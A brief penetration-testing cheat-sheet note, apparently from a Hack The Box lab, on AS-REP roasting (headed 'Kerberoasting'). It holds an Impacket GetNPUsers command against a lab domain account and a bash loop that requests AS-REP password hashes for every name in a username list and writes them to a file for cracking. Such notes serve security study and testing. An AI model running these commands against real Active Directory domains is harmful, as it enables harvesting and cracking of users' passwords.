# Kerberoasting
## GetNPUsers (Impacket)
````bash
impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass
````

## Bruteforcing Kerberoasting
AS-REP roasting is a technique that allows retrieving password hashes for users that have Do not require Kerberos preauthentication property selected:

![](https://www.ired.team/~/files/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-L_nj7h01rJKzhElx_RC%2F-L_njEkL2a_oSCa1g0H9%2FScreenshot%20from%202019-03-12%2021-08-33.png?alt=media&token=dc08b9a5-1cae-4762-a6a0-773735227aad)
````bash
while read p; do GetNPUsers.py <domain>/"$p" -request -no-pass -dc-ip <DC-IP> >> hash.txt; done < usernames.txt
````
